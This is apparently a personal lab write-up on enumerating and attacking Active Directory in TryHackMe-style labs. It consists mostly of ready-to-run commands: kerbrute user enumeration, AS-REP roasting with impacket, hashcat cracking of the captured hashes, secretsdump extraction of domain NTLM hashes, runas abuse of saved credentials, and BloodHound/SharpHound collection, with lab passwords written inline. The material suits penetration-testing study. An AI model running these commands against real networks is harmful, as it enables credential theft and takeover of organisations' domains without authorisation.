---
title: "Enumeration Active Directory"
description: "Enum Active Directory No Credentials 139 & 445 SMB User Enum with Kerberoast Exploit Kerberos via ASREPRoasting ASReproasting occurs when a user account has the privilege \"Does"
lang: "en"
translationKey: "enumeration-active-directory"
category: "lab-writeups"
tags: []
publishDate: "2024-11-09"
draft: true
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "1395fca1-ed80-8097-9b3f-faa00ee389f5"
notionUrl: "https://app.notion.com/p/Enumeration-Active-Directory-1395fca1ed8080979b3ffaa00ee389f5"
notionLastEdited: "2025-01-03T14:51:00.000Z"
---

# Enum Active Directory

## No Credentials

### 139 & 445 (SMB)

```bash
enum4linux 10.10.107.99
```

### User Enum with Kerberoast

```bash
### from nmap we got DNS_Domain_Name: spookysec.local
./kerbrute_linux_amd64 userenum --dc 10.10.107.99 -d spookysec.local userlist.txt
```

### Exploit Kerberos via **ASREPRoasting**

> ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

```bash
impacket-GetNPUsers -dc-ip 10.10.242.75 -request -outputfile hashes.asreproast spookysec.local/ -no-pass -usersfile usernames.txt
```

![](/images/enumeration-active-directory/512c5b5fa16c.png)

Cracking Kerberoast AS-REP

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

## With Credentials

Enumerate SMB Share with credentials we have obtained

![](/images/enumeration-active-directory/62688c39c831.png)

### Dump NTLM HASH via Impacket

```bash
# domain/credential@ip_target
impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@10.10.242.75
```

![](/images/enumeration-active-directory/aec38db4549b.png)

### Runas Winpriv (Stored Credentials)

identify stored credentials :

```bash
cmdkey /list
```

Exploit Saved Credentials :

```bash
runas /savecred /user:WORKGROUP\User "Program to execute"
```

Referensi : [steflan](https://steflan-security.com/windows-privilege-escalation-runas-stored-credentials/), [juggernaut](https://juggernaut-sec.com/runas/)

### Enum OU (Organisational Units)

```bash
Get-ADOrganizationalUnit -Filter {Name -eq "workstations"} 
```

### Enum Using Net

```bash
# Enum all users in domain
net user /domain
# enum spesific user in domain 
net user <nama_user> /domain
# enum all group in domain
net group /domain
# enull spesific group in domain
net group <nama_group> /domain
# enum password policy in domain
net accounts /domain

```

### Enum With Bloodhound

Referensi : [enum with bloodhound](https://medium.com/@e.escalante.jr/active-directory-workshop-even-more-server-enumeration-using-the-bloodhound-tool-pt-9-d4138f505b9b)

```bash
#using bloodhound pyhton
bloodhound-python -d za.tryhackme.com -u leslie.young -p 1CZY15ztC -c all -v -ns 10.200.68.248
#if you always got time out version when running above command
# try to run sharphound from inside.
# using sharphound.exe
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
# using sharphound.ps1
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"

# all above command will produce .zip output, after getting .zip extract and import file
# .json into bloodhound
```

![](/images/enumeration-active-directory/a1aeceed4cc2.png)
